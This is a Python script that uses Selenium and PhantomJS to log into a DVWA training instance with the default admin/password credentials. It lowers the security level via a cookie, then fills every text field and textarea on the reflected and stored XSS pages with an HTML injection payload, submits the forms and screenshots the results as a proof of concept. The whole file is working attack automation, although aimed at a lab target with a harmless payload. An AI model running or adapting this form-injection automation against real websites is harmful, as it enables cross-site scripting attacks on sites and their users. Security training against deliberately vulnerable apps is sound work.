#unset QT_QPA_PLATFORM
#sudo echo "export QT_QPA_PLATFORM=offscreen" >> /etc/environment
from bs4 import BeautifulSoup
import requests
import multiprocessing as mp
from selenium import webdriver
import time
import datetime
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select

class Xss_automate():
	def __init__(self,target,base):
		self.target=target
		self.base=base
		self.email="admin"
		self.password="password"
		self.target_links=["vulnerabilities/xss_r/","vulnerabilities/xss_s/"]

	def start(self):
		try:
			browser = webdriver.PhantomJS()
			browser.get(self.target)
			element_username=browser.find_element_by_name("username");
			element_username.clear()
			element_username.send_keys(self.email)
			element_username.click()
			element_password=browser.find_element_by_name("password");
			element_password.clear()
			element_password.send_keys(self.password)
			element_password.click()

			try:
				element_submit = WebDriverWait(browser, 2).until(
					EC.element_to_be_clickable((By.NAME, "Login"))
				)
				time. sleep(2)
				element_submit.click()
			except Exception as ee:
						print("Exception : "+str(ee))
						browser.quit()
			html = browser.page_source
			cookie={'domain':'192.168.250.1','name': 'security','value':'low',
			'path': '/dvwa/','httponly': False, 'secure': False}
			browser.add_cookie(cookie)
			all_cookies = browser.get_cookies()				
			soup = BeautifulSoup(html, "html.parser")
			anchor_tags=soup.find_all("a")
			browser.save_screenshot('screen.png')
			print("\n Saved Screen shot Post Login.Note the cookie values : ")
			for i,link in enumerate(anchor_tags):
				try:
					if i != 0:
						actuall_link=link.attrs["href"]
						actuall_link=actuall_link.replace("/.","/")
						if actuall_link in self.target_links:
							nav_url=str(self.target)+str(actuall_link)
							browser.get(nav_url)
							browser.save_screenshot("screen"+str(i)+".png")
							page_source=browser.page_source
							soup = BeautifulSoup(page_source, "html.parser")
							forms=soup.find_all("form")
							submit_button=""
							value_sel=False
							payload="<a href='#'> Malacius Link XSS </a>"
							for no,form in enumerate(forms) :

								inputs=form.find_all("input")
								for ip in inputs:
									if ip.attrs["type"] in ["text","password"]:
										element_payload=browser.find_element_by_name(ip.attrs["name"]);
										element_payload.clear()
										element_payload.send_keys(payload)
										element_payload.click()
									elif ip.attrs["type"] in ["submit","button"]:

										submit_button=ip.attrs.get("name","")
										if submit_button == "":
											submit_button=ip.attrs.get("value","")
											value_sel=True
								text_area=form.find_all("textarea")
								for ip in text_area:
									if 1:
										element_payload=browser.find_element_by_name(ip.attrs["name"]);
										element_payload.clear()
										element_payload.send_keys(payload)
										element_payload.click()
													
								try:
									if value_sel==False:
										element_submit = WebDriverWait(browser, 2).until(
										EC.element_to_be_clickable((By.NAME, submit_button)))
									else:
										element_submit = browser.find_element_by_css_selector('[value="'+submit_button+'"]')
									element_submit.click()
									sc="payload_"+str(i)+"_"+str(no)+".png"
									browser.save_screenshot(sc)
									print("\n Saved Payload Screen shot : "+str(sc))
									browser.get(nav_url)
									
								except Exception as ee:
											print("Exception @@: "+str(ee))
											browser.quit()
								
											
						
				except Exception as ex:
					print("## Exception caught : " +str(ex))
			print("\n\nSucessfully executed and created POC")
			
		except Exception as ex:
			print(str(ex))

obj=Xss_automate("http://192.168.250.1/dvwa/","http://192.168.250.1/")
obj.start()
